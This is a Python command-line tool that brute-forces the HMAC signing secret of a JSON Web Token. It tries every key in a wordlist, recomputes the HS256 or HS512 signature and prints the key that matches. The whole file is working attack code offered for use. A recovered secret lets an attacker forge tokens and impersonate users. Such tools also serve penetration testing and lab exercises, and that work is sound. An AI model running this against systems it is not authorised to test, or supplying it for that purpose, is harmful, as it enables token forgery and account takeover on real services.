# Copyright © 2023 Thomas Gingele https://github.com/B1TC0R3

from Crypto.Hash import HMAC, SHA256, SHA512
from base64 import b64encode, b64decode
import argparse


def get_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="JWT Brute Force Script",
        epilog="Copyright © 2023 Thomas Gingele https://github.com/B1TC0R3"
    )

    algorithm_group = parser.add_mutually_exclusive_group()

    parser.add_argument(
        "-t",
        "--token",
        help="the input file containing the JW-Token",
        required=True
    )

    parser.add_argument(
        "-w",
        "--wordlist",
        help="a wordlist to attack the JW-Token",
        required=True
    )

    algorithm_group.add_argument(
        "--hs256",
        action="store_true",
        help="use HMAC-SHA256 algorithm (default)",
        required=False
    )

    algorithm_group.add_argument(
        "--hs512",
        action="store_true",
        help="use HMAC-SHA512 algorithm",
        required=False
    )

    args = parser.parse_args()
    return args


def dissect_jwt(token) -> tuple[str, str, str]:
    token_fields = token.split('.')

    if len(token_fields) != 3:
        raise Exception("Invalid JWT Format")

    header    = token_fields[0]
    payload   = token_fields[1]
    signature = token_fields[2]

    return (header, payload, signature)


def get_digest_modifier(args):
    if args.hs512:
        return SHA512
    else:
        return SHA256


def jwt_format(signature) -> str:
    return signature.decode()\
                    .replace("+", "-")\
                    .replace("/", "_")\
                    .replace("=", "")


def main():
    token = None

    args = get_args()

    with open(args.token, 'r') as token_file:
        token = token_file.read().strip()

    digestmod = get_digest_modifier(args)
    (header, payload, signature) = dissect_jwt(token)
    public_signature_component = f"{header}.{payload}"

    with open(args.wordlist, 'r') as wordlist:
        while key := wordlist.readline():
            key = key.replace('\n', '')

            algorithm = HMAC.new(
                key.encode(),
                public_signature_component.encode(),
                digestmod=digestmod
            )

            guessed_signature = jwt_format(
                b64encode(
                    algorithm.digest()
                )
            )

            if (signature == guessed_signature):
                print(f"KEY :: {key}")
                break;


if __name__ == "__main__":
    main()
